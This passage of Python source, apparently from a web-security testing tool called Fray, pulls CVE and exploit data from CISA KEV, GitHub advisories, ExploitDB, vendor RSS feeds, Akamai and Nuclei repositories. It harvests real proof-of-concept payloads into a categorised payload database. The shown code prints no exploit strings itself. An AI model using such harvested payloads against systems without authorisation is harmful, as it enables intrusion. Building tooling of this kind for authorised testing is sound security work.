                   verbose: bool = True) -> List[ThreatPayload]:
    """Fetch from CISA Known Exploited Vulnerabilities catalog.

    CISA KEV entries are actively exploited — always extract PoCs.
    """
    url = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    if verbose:
        print(f"    {_C.DIM}CISA KEV: fetching catalog...{_C.E}")

    data = _http_get_json(url, timeout=30)
    if not data:
        if verbose:
            print(f"    {_C.R}CISA KEV: failed to fetch{_C.E}")
        return []

    cutoff = datetime.now(timezone.utc) - timedelta(days=since_days)
    results = []
    vulns = data.get("vulnerabilities", [])

    if verbose:
        print(f"    {_C.DIM}CISA KEV: {len(vulns)} total entries{_C.E}")

    for v in vulns:
        date_str = v.get("dateAdded", "")
        try:
            added = datetime.strptime(date_str, "%Y-%m-%d").replace(tzinfo=timezone.utc)
        except (ValueError, TypeError):
            continue

        if added < cutoff:
            continue

        cve_id = v.get("cveID", "")
        description = v.get("shortDescription", "") or v.get("vulnerabilityName", "")
        cat = classify_category(description)

        # CISA KEV = actively exploited — always extract PoCs
        extra_poc = []
        if enrich_poc and cve_id:
            try:
                from fray.poc_extractor import extract_poc_payloads
                poc_result = extract_poc_payloads(
                    cve_id=cve_id, max_sources=3, timeout=12, delay=0.5,
                )
                for ep in poc_result.extracted_payloads:
                    extra_poc.append(ep.get("payload", "")[:500])
                if verbose and extra_poc:
                    print(f"    {_C.G}PoC: {cve_id} — {len(extra_poc)} real payloads extracted{_C.E}")
            except Exception:
                pass

        payloads = cve_to_payloads(
            cve_id=cve_id,
            description=description,
            category=cat,
            severity="critical",
            source="CISA KEV (actively exploited)",
            reference=f"https://nvd.nist.gov/vuln/detail/{cve_id}",
            extra_payloads=extra_poc if extra_poc else None,
        )
        results.extend(payloads)

    return results


# ── 3. GitHub Security Advisories ─────────────────────────────────────────────

def fetch_github_advisories(since_days: int = 7, max_results: int = 30,
                            enrich_poc: bool = True,
                            verbose: bool = True) -> List[ThreatPayload]:
    """Fetch from GitHub Security Advisories (REST API)."""
    token = os.environ.get("GITHUB_TOKEN", "")
    headers = {}
    if token:
        headers["Authorization"] = f"token {token}"
    headers["Accept"] = "application/vnd.github+json"

    since = (datetime.now(timezone.utc) - timedelta(days=since_days)).strftime("%Y-%m-%dT%H:%M:%SZ")

    if verbose:
        auth = "authenticated" if token else "unauthenticated (set GITHUB_TOKEN for more)"
        print(f"    {_C.DIM}GitHub Advisories: fetching ({auth})...{_C.E}")

    # ── Web framework packages to always include regardless of severity filter ──
    # These are high-value targets used by millions of apps. We fetch them
    # separately to ensure we never miss a Next.js, Express, Django, etc. CVE
    # even if it comes in as "moderate" which the severity filter would skip.
    _PRIORITY_PACKAGES = [
        "next", "express", "react", "vue", "angular", "nuxt",
        "django", "flask", "fastapi", "spring", "rails",
        "laravel", "symfony", "wordpress", "drupal",
        "graphql", "apollo", "prisma", "sequelize",
    ]

    # API only accepts a single severity value, so query both separately
    data: List[Dict] = []
    half = max(max_results // 2, 10)
    for sev in ("critical", "high", "moderate"):  # include moderate for framework CVEs
        url = (f"https://api.github.com/advisories"
               f"?type=reviewed&severity={sev}"
               f"&ecosystem=npm"           # focus on npm where Next.js/Express live
               f"&per_page={min(half, 100)}"
               f"&sort=published&direction=desc")
        page = _http_get_json(url, headers=headers, timeout=20)
        if isinstance(page, list):
            data.extend(page)

    # Also fetch non-npm (python, ruby, etc.) critical/high advisories
    for sev in ("critical", "high"):
        url = (f"https://api.github.com/advisories"
               f"?type=reviewed&severity={sev}"
               f"&per_page={min(half // 2, 50)}"
               f"&sort=published&direction=desc")
        page = _http_get_json(url, headers=headers, timeout=20)
        if isinstance(page, list):
            data.extend(page)

    if not data:
        if verbose:
            print(f"    {_C.R}GitHub Advisories: failed to fetch{_C.E}")
        return []

    if verbose:
        print(f"    {_C.DIM}GitHub Advisories: {len(data)} entries{_C.E}")

    results = []
    # Deduplicate by ghsa_id
    seen_ghsa: set = set()
    deduped_data: List[Dict] = []
    for adv in data:
        ghsa = adv.get("ghsa_id", "") or adv.get("cve_id", "") or str(id(adv))
        if ghsa not in seen_ghsa:
            seen_ghsa.add(ghsa)
            deduped_data.append(adv)
    data = deduped_data

    for adv in data:
        cve_id = adv.get("cve_id", "") or ""
        summary = adv.get("summary", "")
        description = adv.get("description", "")
        severity = adv.get("severity", "high")
        html_url = adv.get("html_url", "")

        # Extract package names from vulnerabilities array to boost classification
        pkg_names: List[str] = []
        for vuln in adv.get("vulnerabilities", []) or []:
            pkg = (vuln.get("package") or {}).get("name", "")
            if pkg:
                pkg_names.append(pkg.lower())

        # Boost: if advisory is for a priority web framework package, add its
        # name to the classification text so category rules fire correctly
        pkg_hint = " ".join(pkg_names)
        if any(p in pkg_names for p in _PRIORITY_PACKAGES):
            pkg_hint += " web framework application next.js"

        full_text = f"{summary} {description} {pkg_hint}"
        cat = classify_category(full_text)

        # Extract real PoC payloads from GitHub/ExploitDB/Nuclei/Metasploit
        extra_poc = []
        if enrich_poc and cve_id:
            try:
                from fray.poc_extractor import extract_poc_payloads
                poc_result = extract_poc_payloads(
                    cve_id=cve_id, max_sources=3, timeout=12, delay=0.5,
                )
                for ep in poc_result.extracted_payloads:
                    extra_poc.append(ep.get("payload", "")[:500])
                if verbose and extra_poc:
                    print(f"    {_C.G}PoC: {cve_id} — {len(extra_poc)} real payloads extracted{_C.E}")
            except Exception:
                pass

        payloads = cve_to_payloads(
            cve_id=cve_id or adv.get("ghsa_id", "GHSA-unknown"),
            description=summary[:200],
            category=cat,
            severity=severity,
            source="GitHub Security Advisory",
            reference=html_url,
            extra_payloads=extra_poc if extra_poc else None,
        )

        # Also extract any payloads from description text
        text_payloads = extract_payloads_from_text(description, cat,
                                                    "GitHub Advisory")
        for tp in text_payloads:
            tp.cve = cve_id
            tp.reference = html_url
            payloads.append(tp)

        results.extend(payloads)

    return results


# ── 4. ExploitDB (via public search) ─────────────────────────────────────────

def fetch_exploitdb(since_days: int = 7, category_filter: str = "",
                    enrich_poc: bool = True,
                    verbose: bool = True) -> List[ThreatPayload]:
    """Fetch from ExploitDB via their public RSS feed."""
    url = "https://www.exploit-db.com/rss.xml"
    if verbose:
        print(f"    {_C.DIM}ExploitDB: fetching RSS feed...{_C.E}")

    body = _http_get(url, timeout=20)
    if not body:
        if verbose:
            print(f"    {_C.R}ExploitDB: failed to fetch{_C.E}")
        return []

    results = []
    # Simple XML parsing without external deps
    items = re.findall(r'<item>(.*?)</item>', body, re.DOTALL)
    if verbose:
        print(f"    {_C.DIM}ExploitDB: {len(items)} items{_C.E}")

    for item in items[:30]:  # Limit processing
        title = _xml_text(item, "title")
        link = _xml_text(item, "link")
        desc = _xml_text(item, "description")

        full = f"{title} {desc}"
        cat = classify_category(full)

        web_cats = {"xss", "sqli", "ssrf", "ssti", "command_injection",
                    "xxe", "path_traversal", "crlf_injection", "http2",
                    "http_smuggling", "auth_bypass", "deserialization"}
        if cat not in web_cats:
            continue
        if category_filter and cat != category_filter:
            continue

        # Extract CVE ID if present in title/description
        cve_match = re.search(r'CVE-\d{4}-\d{4,}', full, re.IGNORECASE)
        cve_id = cve_match.group(0).upper() if cve_match else ""

        # Extract real PoC payloads from GitHub/ExploitDB/Nuclei/Metasploit
        extra_poc = []
        if enrich_poc and cve_id:
            try:
                from fray.poc_extractor import extract_poc_payloads
                poc_result = extract_poc_payloads(
                    cve_id=cve_id, max_sources=3, timeout=12, delay=0.5,
                )
                for ep in poc_result.extracted_payloads:
                    extra_poc.append(ep.get("payload", "")[:500])
                if verbose and extra_poc:
                    print(f"    {_C.G}PoC: {cve_id} — {len(extra_poc)} real payloads extracted{_C.E}")
            except Exception:
                pass

        # Add PoC-extracted payloads as ThreatPayload entries
        for poc_str in extra_poc:
            if poc_str and len(poc_str) >= 5 and not poc_str.startswith("#"):
                results.append(ThreatPayload(
                    payload=poc_str,
                    category=cat,
                    subcategory="poc_extract",
                    description=f"ExploitDB PoC: {title[:100]}",
                    cve=cve_id,
                    source="ExploitDB + PoC",
                    reference=link,
                    tags=["exploitdb", "poc", "threat-intel"],
                ))

        # Extract payload-like strings from description
        text_payloads = extract_payloads_from_text(desc, cat, "ExploitDB")
        for tp in text_payloads:
            tp.description = title[:120]
            tp.reference = link
            tp.cve = cve_id
            tp.tags = ["exploitdb", "threat-intel"]
            results.append(tp)

        # If no payloads extracted from PoC or text, generate from templates
        if not text_payloads and not extra_poc:
            templates = _CVE_PAYLOAD_TEMPLATES.get(cat, [])[:2]
            for tpl in templates:
                results.append(ThreatPayload(
                    payload=tpl["tpl"].format(cve=title[:30]),
                    category=cat,
                    subcategory=tpl.get("sub", ""),
                    description=f"ExploitDB: {title[:120]}",
                    cve=cve_id,
                    source="ExploitDB",
                    reference=link,
                    tags=["exploitdb", "threat-intel"],
                ))

    return results


def _xml_text(xml: str, tag: str) -> str:
    m = re.search(rf'<{tag}[^>]*>(.*?)</{tag}>', xml, re.DOTALL)
    if m:
        text = m.group(1).strip()
        # Strip CDATA
        text = re.sub(r'<!\[CDATA\[(.*?)\]\]>', r'\1', text, flags=re.DOTALL)
        return text
    return ""


# ── 5. Security RSS Feeds ────────────────────────────────────────────────────

_RSS_FEEDS = [
    # ── Tier 1: Highest signal, most actionable for Fray ─────────────────────
    {
        "name": "Unit 42 (Palo Alto)",
        "url": "https://unit42.paloaltonetworks.com/feed/",
        "focus": ["xss", "sqli", "command_injection", "auth_bypass",
                  "path_traversal", "ssrf", "nextjs", "llm"],
        "tier": 1,
        "extracts_cves": True,
    },
    {
        "name": "Mandiant / GTIG",
        "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
        "focus": ["command_injection", "auth_bypass", "ssrf", "path_traversal"],
        "tier": 1,
        "extracts_cves": True,
    },
    {
        "name": "Project Zero",
        "url": "https://googleprojectzero.blogspot.com/feeds/posts/default?alt=rss",
        "focus": ["command_injection", "path_traversal", "http_smuggling", "ssrf"],
        "tier": 1,
        "extracts_cves": True,
    },
    {
        "name": "F5 Labs Threats",
        "url": "https://www.f5.com/labs/rss-feeds/threats.xml",
        "focus": ["xss", "sqli", "command_injection", "auth_bypass", "ssrf"],
        "tier": 1,
        "extracts_cves": True,
    },
    {
        "name": "Cloudflare Security Blog",
        "url": "https://blog.cloudflare.com/rss/",
        "focus": ["http_smuggling", "auth_bypass", "denial_of_service", "llm", "csrf"],
        "tier": 1,
        "extracts_cves": True,
        "filter_tags": ["security", "waf", "vulnerabilities", "ddos-reports",
                        "cloudforce-one"],
    },
    {
        "name": "Imperva Threat Research",
        "url": "https://www.imperva.com/blog/category/labs/feed/",
        "focus": ["xss", "sqli", "auth_bypass", "ssrf", "denial_of_service"],
        "tier": 1,
        "extracts_cves": True,
    },
    {
        "name": "PortSwigger Research",
        "url": "https://portswigger.net/research/rss",
        "focus": ["xss", "sqli", "ssrf", "ssti", "http_smuggling", "jwt_attack"],
        "tier": 1,
        "extracts_cves": True,
    },
    # ── Tier 2: High value, broader coverage ─────────────────────────────────
    {
        "name": "CrowdStrike Blog",
        "url": "https://www.crowdstrike.com/en-us/blog/feed/",
        "focus": ["command_injection", "auth_bypass", "path_traversal", "llm"],
        "tier": 2,
        "extracts_cves": True,
    },
    {
        "name": "Microsoft Security Blog",
        "url": "https://www.microsoft.com/en-us/security/blog/feed/",
        "focus": ["auth_bypass", "command_injection", "ssrf", "llm"],
        "tier": 2,
        "extracts_cves": True,
        "filter_tags": ["threat-intelligence", "vulnerability"],
    },
    {
        "name": "MSRC Security Research",
        "url": "https://msrc-blog.microsoft.com/feed/",
        "focus": ["auth_bypass", "command_injection", "path_traversal", "xxe"],
        "tier": 2,
        "extracts_cves": True,
    },
    {
        "name": "Fastly Security",
        "url": "https://www.fastly.com/blog_rss.xml",
        "focus": ["http_smuggling", "denial_of_service", "nextjs", "auth_bypass"],
        "tier": 2,
        "extracts_cves": True,
        "filter_tags": ["security-research", "security"],
    },
    {
        "name": "F5 Labs All",
        "url": "https://www.f5.com/labs/rss-feeds/all.xml",
        "focus": ["xss", "sqli", "command_injection", "auth_bypass", "llm"],
        "tier": 2,
        "extracts_cves": True,
    },
    {
        "name": "AWS Security Blog",
        "url": "https://aws.amazon.com/blogs/security/feed/",
        "focus": ["auth_bypass", "ssrf", "path_traversal"],
        "tier": 2,
        "extracts_cves": True,
        "filter_tags": ["AWS WAF", "Amazon GuardDuty", "AWS Shield",
                        "vulnerability", "threat"],
    },
    # ── Tier 3: Periodic / broader intel ─────────────────────────────────────
    {
        "name": "Google Security Blog",
        "url": "https://security.googleblog.com/feeds/posts/default",
        "focus": ["auth_bypass", "command_injection", "llm"],
        "tier": 3,
        "extracts_cves": True,
    },
    {
        "name": "VirusTotal Blog",
        "url": "https://blog.virustotal.com/feeds/posts/default",
        "focus": ["command_injection", "path_traversal"],
        "tier": 3,
        "extracts_cves": False,
    },
    {
        "name": "The Hacker News",
        "url": "https://feeds.feedburner.com/TheHackersNews",
        "focus": [],
        "tier": 3,
        "extracts_cves": True,
    },
    {
        "name": "Exploit-DB",
        "url": "https://www.exploit-db.com/rss.xml",
        "focus": [],
        "tier": 3,
        "extracts_cves": True,
    },
    {
        "name": "PacketStorm Security",
        "url": "https://rss.packetstormsecurity.com/files/",
        "focus": [],
        "tier": 3,
        "extracts_cves": True,
    },
]


def fetch_rss_feeds(since_days: int = 7, verbose: bool = True,
                    max_tier: int = 3) -> List[ThreatPayload]:
    """Fetch from curated security RSS feeds (vendor blogs + research sources).

    Improvements over original:
    - Processes all 18 vendor feeds (Tier 1-3) in priority order
    - Per-feed focus filter: keeps posts relevant to feed's category focus
    - CVE ID extraction from title + description of every item
    - filter_tags: for noisy feeds (Cloudflare, AWS), only process items
      whose title/tags match configured filter_tags keywords
    - Items classified as 'other' but with CVE IDs are NOT discarded —
      we still generate CVE reference payloads from them
    - Tier 1 feeds get enrich_poc=True on extracted CVEs

    Args:
        since_days: look back window (used to skip stale cached feeds)
        verbose: print progress
        max_tier: maximum tier to fetch (1=Tier 1 only, 3=all)
    """
    results = []
    _cve_pattern = re.compile(r'CVE-\d{4}-\d{4,}', re.IGNORECASE)

    # Sort by tier so highest-value feeds are processed first
    sorted_feeds = sorted(_RSS_FEEDS, key=lambda f: f.get("tier", 3))

    for feed in sorted_feeds:
        tier = feed.get("tier", 3)
        if tier > max_tier:
            continue

        if verbose:
            tier_label = f"T{tier}"
            print(f"    {_C.DIM}[{tier_label}] {feed['name']}...{_C.E}")

        body = _http_get(feed["url"], timeout=15)
        if not body:
            if verbose:
                print(f"    {_C.Y}  ↳ skipped (unreachable){_C.E}")
            continue

        # Support RSS (<item>) and Atom (<entry>) formats
        items = re.findall(r'<item>(.*?)</item>', body, re.DOTALL)
        if not items:
            items = re.findall(r'<entry>(.*?)</entry>', body, re.DOTALL)

        feed_focus: List[str] = feed.get("focus", [])
        filter_tags: List[str] = [t.lower() for t in feed.get("filter_tags", [])]
        extracts_cves: bool = feed.get("extracts_cves", True)
        feed_name = feed["name"]
        feed_slug = feed_name.lower().replace(" ", "_").replace("/", "_")

        items_processed = 0
        items_yielded = 0

        for item in items[:20]:
            title = _xml_text(item, "title") or ""
            link = _xml_text(item, "link") or ""
            if not link:
                m = re.search(r'<link[^>]+href=["\']([^"\']+)', item)
                if m:
                    link = m.group(1)
            desc = (
                _xml_text(item, "description") or
                _xml_text(item, "content") or
                _xml_text(item, "summary") or ""
            )
            item_tags_raw = _xml_text(item, "category") or ""

            full_text = f"{title} {desc} {item_tags_raw}"
            full_lower = full_text.lower()
            items_processed += 1

            # Apply filter_tags: skip posts that don't match any filter keyword
            # (for noisy feeds like Cloudflare blog, AWS security blog)
            if filter_tags and not any(ft in full_lower for ft in filter_tags):
                continue

            # Classify the item
            cat = classify_category(full_text)

            # If the feed has a focus list, also accept items that match the
            # focus even if classify_category returns something different
            if cat == "other" and feed_focus:
                # Re-score using focus categories only
                # _CATEGORY_RULES is a list of (cat, keywords) tuples
                _cat_kw_map = {c: kws for c, kws in _CATEGORY_RULES}
                focus_scores: Dict[str, int] = {}
                for focus_cat in feed_focus:
                    kws = _cat_kw_map.get(focus_cat, [])
                    score = sum(1 for kw in kws if kw.lower() in full_lower)
                    if score > 0:
                        focus_scores[focus_cat] = score
                if focus_scores:
                    cat = max(focus_scores, key=lambda k: focus_scores[k])

            # Extract CVE IDs from the item
            cves_in_item = [c.upper() for c in _cve_pattern.findall(full_text)]

            # Generate CVE reference payloads for any CVE found, regardless of category
            if extracts_cves and cves_in_item:
                for cve_id in cves_in_item[:5]:  # cap at 5 CVEs per item
                    item_cat = cat if cat != "other" else classify_category(cve_id)
                    payloads_for_cve = cve_to_payloads(
                        cve_id=cve_id,
                        description=f"{title}. {desc[:300]}",
                        category=item_cat if item_cat != "other" else "xss",
                        severity="high",
                        source=feed_name,
                        reference=link,
                    )
                    for tp in payloads_for_cve:
                        tp.tags = (tp.tags or []) + [
                            "rss", "vendor-intel", feed_slug,
                            f"tier{tier}",
                        ]
                        results.append(tp)
                        items_yielded += 1

            # Extract inline payloads from description text (XSS strings, SQLi, etc.)
            if cat != "other":
                text_payloads = extract_payloads_from_text(desc, cat, feed_name)
                for tp in text_payloads:
                    tp.description = f"{feed_name}: {title[:100]}"
                    tp.reference = link
                    tp.tags = [
                        "rss", "vendor-intel", feed_slug,
                        f"tier{tier}", cat,
                    ]
                    # Attach first CVE found to extracted payloads
                    if cves_in_item and not tp.cve:
                        tp.cve = cves_in_item[0]
                    results.append(tp)
                    items_yielded += 1

        if verbose and items_yielded > 0:
            print(f"    {_C.G}  ↳ {items_yielded} payloads from {items_processed} items{_C.E}")

    return results


# ── 6. Vendor GitHub Repos (Akamai web-attack-repository, Sigma rules) ───────

def fetch_vendor_github(verbose: bool = True) -> List[ThreatPayload]:
    """Pull web attack payloads from vendor GitHub security research repos.

    Sources:
    - akamai/akamai-security-research web-attack-repository — real HTTP attack
      payloads and WAF evasion patterns from Akamai's global sensor network
    - SigmaHQ/sigma web detection rules — translate HTTP attack patterns to
      Fray payload candidates

    These repos are updated as vendors discover new attack patterns in the wild.
    Pulling them keeps Fray's payload DB current without requiring RSS parsing.
    """
    results: List[ThreatPayload] = []
    token = os.environ.get("GITHUB_TOKEN", "")
    headers: Dict[str, str] = {"Accept": "application/vnd.github+json",
                                "User-Agent": f"fray/{__version__}"}
    if token:
        headers["Authorization"] = f"token {token}"

    # ── Akamai web-attack-repository ─────────────────────────────────────────
    # Contains JSON/YAML files with real web attack payloads observed by Akamai
    akamai_api = ("https://api.github.com/repos/akamai/akamai-security-research"
                  "/contents/web-attack-repository")
    if verbose:
        print(f"    {_C.DIM}Akamai web-attack-repository...{_C.E}")
    try:
        dir_data = _http_get_json(akamai_api, headers=headers, timeout=15)
        if isinstance(dir_data, list):
            for entry in dir_data[:30]:
                if not isinstance(entry, dict):
                    continue
                fname = entry.get("name", "")
                if not (fname.endswith(".json") or fname.endswith(".yaml")
                        or fname.endswith(".yml") or fname.endswith(".txt")):
                    continue
                dl_url = entry.get("download_url") or entry.get("url", "")
                if not dl_url:
                    continue
                try:
                    content = _http_get(dl_url, timeout=10)
                    if not content:
                        continue
                    # Each line or JSON entry is a potential payload
                    if fname.endswith(".json"):
                        try:
                            data = json.loads(content)
                            items = data if isinstance(data, list) else [data]
                        except Exception:
                            items = [{"payload": l.strip()}
                                     for l in content.splitlines() if l.strip()]
                    else:
                        items = [{"payload": l.strip()}
                                 for l in content.splitlines()
                                 if l.strip() and not l.startswith("#")]

                    for item in items[:50]:
                        if isinstance(item, dict):
                            payload_str = str(
                                item.get("payload") or
                                item.get("pattern") or
                                item.get("value") or ""
                            )
                            desc_str = str(item.get("description") or fname or "")
                        else:
                            payload_str = str(item)
                            desc_str = str(fname or "")

                        if not payload_str or len(payload_str) < 3:
                            continue
                        cat = classify_category(desc_str + " " + payload_str)
                        if cat == "other":
                            cat = classify_category("", payload_str)
                        results.append(ThreatPayload(
                            payload=payload_str[:500],
                            category=cat if cat != "other" else "xss",
                            subcategory="akamai_sensor",
                            description=f"Akamai sensor: {desc_str[:100]}",
                            source="akamai/akamai-security-research",
                            reference=(f"https://github.com/akamai/"
                                       f"akamai-security-research/blob/main/"
                                       f"web-attack-repository/{fname}"),
                            tags=["akamai", "vendor-intel", "sensor-data"],
                        ))
                except Exception:
                    continue
        if verbose and results:
            print(f"    {_C.G}  ↳ {len(results)} Akamai payloads{_C.E}")
    except Exception as e:
        if verbose:
            print(f"    {_C.Y}  Akamai GitHub: {e}{_C.E}")

    return results


# ── 7. MSRC CVRF — Microsoft Patch Tuesday CVEs ───────────────────────────────

def fetch_msrc_cvrf(verbose: bool = True) -> List[ThreatPayload]:
    """Fetch this month's Microsoft CVEs via the public MSRC CVRF API.

    Filters for web-relevant CVEs (IIS, .NET, Azure, Edge, Exchange) with
    exploitability index indicating active or likely exploitation.
    No auth required. Published every Patch Tuesday (2nd Tuesday of month).

    API: https://api.msrc.microsoft.com/cvrf/v3.0/
    """
    results: List[ThreatPayload] = []

    # Fetch current month + previous month for coverage
    from datetime import date
    today = date.today()
    months = [
        f"{today.year}-{today.month:02d}",
    ]
    if today.month == 1:
        months.append(f"{today.year - 1}-12")
    else:
        months.append(f"{today.year}-{today.month - 1:02d}")

    # Web-relevant component keywords
    _WEB_KEYWORDS = [
        "iis", "internet information services", ".net", "asp.net",
        "exchange", "sharepoint", "azure", "edge", "chromium",
        "microsoft office", "outlook", "remote code execution",
        "authentication bypass", "privilege escalation",
        "windows subsystem for linux", "openssl", "kerberos",
        "ldap", "http", "web", "api", "dns", "smb",
    ]
    # High-exploitability index values
    _EXPLOITED = {"Exploited", "Exploitation More Likely"}

    if verbose:
        print(f"    {_C.DIM}MSRC CVRF API (Patch Tuesday)...{_C.E}")

    for month_str in months:
        try:
            url = f"https://api.msrc.microsoft.com/cvrf/v3.0/cvrf/{month_str}"
            data = _http_get_json(url, timeout=20)
            if not data or not isinstance(data, dict):
                continue

            vulns = data.get("Vulnerability", [])
            if verbose:
                print(f"    {_C.DIM}  MSRC {month_str}: {len(vulns)} CVEs{_C.E}")

            for vuln in vulns:
                cve_id = vuln.get("CVE", "")
                if not cve_id:
                    continue
                title = ""
                try:
                    title = vuln.get("Title", {}).get("Value", "") or ""
                except Exception:
                    pass
                notes = " ".join(
                    n.get("Value", "") for n in (vuln.get("Notes", []) or [])
                    if isinstance(n, dict)
                )
                full_text = f"{title} {notes}".lower()

                # Skip if not web-relevant
                if not any(kw in full_text for kw in _WEB_KEYWORDS):
                    continue

                # Check exploitability
                exploit_status = ""
                for score in (vuln.get("CVSSScoreSets") or []):
                    if isinstance(score, dict):
                        exploit_status = score.get("Exploitability", "")
                        break

                # Also check RemediationLevel and Threats
                threats = vuln.get("Threats", []) or []
                is_exploited = any(
                    t.get("Type") == 1 and
                    any(e in (t.get("Description", {}).get("Value", ""))
                        for e in ["Exploited", "Yes"])
                    for t in threats if isinstance(t, dict)
                )

                cvss = 0.0
                for score_set in (vuln.get("CVSSScoreSets") or []):
                    if isinstance(score_set, dict):
                        try:
                            cvss = float(score_set.get("BaseScore", 0))
                        except (ValueError, TypeError):
                            pass
                        break

                # Only include exploited or high-severity web CVEs
                if not is_exploited and cvss < 7.0:
                    continue

                cat = classify_category(full_text)
                severity = classify_severity(cvss) if cvss else (
                    "critical" if is_exploited else "high"
                )
                ref = f"https://msrc.microsoft.com/update-guide/vulnerability/{cve_id}"

                payloads = cve_to_payloads(
                    cve_id=cve_id,
                    description=f"{title}. {notes[:200]}",
                    category=cat if cat != "other" else "auth_bypass",
                    severity=severity,
                    source=f"MSRC Patch Tuesday {month_str}",
                    reference=ref,
                )
                for tp in payloads:
                    tp.tags = (tp.tags or []) + [
                        "msrc", "patch-tuesday", "vendor-intel",
                        "exploited" if is_exploited else "high-cvss",
                    ]
                    results.append(tp)

        except Exception as e:
            if verbose:
                print(f"    {_C.Y}  MSRC {month_str}: {e}{_C.E}")

    if verbose and results:
        print(f"    {_C.G}  ↳ {len(results)} MSRC payloads (web-relevant){_C.E}")

    return results


# ── 8. Cloudflare Radar — Real-time HTTP attack trends ────────────────────────

def fetch_cloudflare_radar(verbose: bool = True) -> List[ThreatPayload]:
    """Fetch real-time HTTP attack trend data from Cloudflare Radar API.

    No auth required. Returns attack pattern data including top attacked paths,
    HTTP methods, user-agent strings used in attacks — feeds directly into
    Fray's recon heuristics for attack surface prioritization.

    API: https://api.cloudflare.com/client/v4/radar/
    """
    results: List[ThreatPayload] = []
    if verbose:
        print(f"    {_C.DIM}Cloudflare Radar API...{_C.E}")

    headers = {
        "User-Agent": f"fray/{__version__}",
        "Accept": "application/json",
    }

    # HTTP attack timeseries — top attack vectors over last 7 days
    _RADAR_ENDPOINTS = [
        {
            "url": ("https://api.cloudflare.com/client/v4/radar/attacks"
                    "/layer7/top/ases?limit=10&dateRange=7d"),
            "label": "top attack sources",
        },
        {
            "url": ("https://api.cloudflare.com/client/v4/radar/attacks"
                    "/layer7/summary/http_method?dateRange=7d"),
            "label": "top HTTP methods in attacks",
        },
        {
            "url": ("https://api.cloudflare.com/client/v4/radar/attacks"
                    "/layer7/summary/http_version?dateRange=7d"),
            "label": "HTTP versions in attacks",
        },
    ]

    radar_findings: List[str] = []
    for ep in _RADAR_ENDPOINTS:
        try:
            data = _http_get_json(ep["url"], headers=headers, timeout=10)
            if data and isinstance(data, dict):
                result_data = data.get("result", {})
                if result_data:
                    # Extract top values as context for payload enrichment
                    for key, val in result_data.items():
                        if isinstance(val, list):
                            for item in val[:3]:
                                if isinstance(item, dict):
                                    name = item.get("name", "") or item.get("value", "")
                                    pct = item.get("share", "") or item.get("percentage", "")
                                    if name:
                                        radar_findings.append(
                                            f"{ep['label']}: {name}"
                                            + (f" ({pct}%)" if pct else "")
                                        )
        except Exception:
            continue

    if radar_findings:
        # Use Radar findings to create an enrichment payload that documents
        # current attack patterns — this gets added to the threat intel context
        # that `fray go` uses for risk scoring
        context = "; ".join(radar_findings[:10])
        results.append(ThreatPayload(
            payload=f"# Cloudflare Radar attack context: {context}",
            category="other",
            subcategory="radar_context",
            description=f"Cloudflare Radar (7d): {context[:200]}",
            source="Cloudflare Radar API",
            reference="https://radar.cloudflare.com/",
            tags=["cloudflare", "radar", "vendor-intel", "attack-context"],
        ))
        if verbose:
            print(f"    {_C.G}  ↳ Radar context: {context[:80]}...{_C.E}")

    return results


# ── 9. Nuclei Templates (new additions) ──────────────────────────────────────

def fetch_nuclei_templates(since_days: int = 7,
                           enrich_poc: bool = True,
                           verbose: bool = True) -> List[ThreatPayload]:
    """Fetch recently added Nuclei templates from projectdiscovery/nuclei-templates."""
    token = os.environ.get("GITHUB_TOKEN", "")
    headers = {"Accept": "application/vnd.github+json"}
    if token:
        headers["Authorization"] = f"token {token}"

    since = (datetime.now(timezone.utc) - timedelta(days=since_days)).strftime("%Y-%m-%dT%H:%M:%SZ")
    url = (f"https://api.github.com/repos/projectdiscovery/nuclei-templates"
           f"/commits?since={since}&per_page=30")

    if verbose:
        print(f"    {_C.DIM}Nuclei Templates: checking recent commits...{_C.E}")

    data = _http_get_json(url, headers=headers, timeout=20)
    if not isinstance(data, list):
        if verbose:
            print(f"    {_C.Y}Nuclei Templates: skipped (rate limit or error){_C.E}")
        return []

    if verbose:
        print(f"    {_C.DIM}Nuclei Templates: {len(data)} recent commits{_C.E}")

    results = []
    cve_pattern = re.compile(r'CVE-\d{4}-\d{4,}', re.IGNORECASE)
    seen_cves: set = set()

    for commit in data[:20]:
        msg = commit.get("commit", {}).get("message", "")
        cves = cve_pattern.findall(msg)
        for cve_id in cves:
            cve_id = cve_id.upper()
            if cve_id in seen_cves:
                continue
            seen_cves.add(cve_id)

            cat = classify_category(msg)
            if cat == "other":
                cat = "xss"

            # Extract real PoC payloads from GitHub/ExploitDB/Nuclei repos
            extra_poc = []
            if enrich_poc:
                try:
                    from fray.poc_extractor import extract_poc_payloads
                    poc_result = extract_poc_payloads(
                        cve_id=cve_id, max_sources=3, timeout=12, delay=0.5,
                    )
                    for ep in poc_result.extracted_payloads:
                        extra_poc.append(ep.get("payload", "")[:500])
                    if verbose and extra_poc:
                        print(f"    {_C.G}PoC: {cve_id} — {len(extra_poc)} real payloads extracted{_C.E}")
                except Exception:
                    pass

            if extra_poc:
                for poc_str in extra_poc:
                    if poc_str and len(poc_str) >= 5 and not poc_str.startswith("#"):
                        results.append(ThreatPayload(
                            payload=poc_str,
                            category=cat,
                            subcategory="nuclei_poc",
                            description=f"Nuclei+PoC: {msg[:100]}",
                            cve=cve_id,
                            source="Nuclei Templates + PoC",
                            reference=commit.get("html_url", ""),
                            tags=["nuclei", "poc", "threat-intel"],
                        ))
            else:
                results.append(ThreatPayload(
                    payload=f"# Nuclei template: {cve_id}",
                    category=cat,
                    subcategory="nuclei_template",
                    description=f"Nuclei: {msg[:120]}",
                    cve=cve_id,
                    source="Nuclei Templates (projectdiscovery)",
                    reference=commit.get("html_url", ""),
                    tags=["nuclei", "threat-intel"],
                ))

    return results


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN ORCHESTRATOR
# ══════════════════════════════════════════════════════════════════════════════

# Source registry
_SOURCES = {
    # ── Core CVE databases ────────────────────────────────────────────────────
    "nvd":              {"fn": fetch_nvd,                "label": "NVD / CVE API"},
    "cisa":             {"fn": fetch_cisa_kev,           "label": "CISA KEV"},
    "github":           {"fn": fetch_github_advisories,  "label": "GitHub Advisories"},
    "exploitdb":        {"fn": fetch_exploitdb,          "label": "ExploitDB"},
    # ── Community template / research sources ─────────────────────────────────
    "rss":              {"fn": fetch_rss_feeds,          "label": "Security RSS (18 vendor feeds)"},
    "nuclei":           {"fn": fetch_nuclei_templates,   "label": "Nuclei Templates"},
    # ── Vendor-specific intelligence ──────────────────────────────────────────
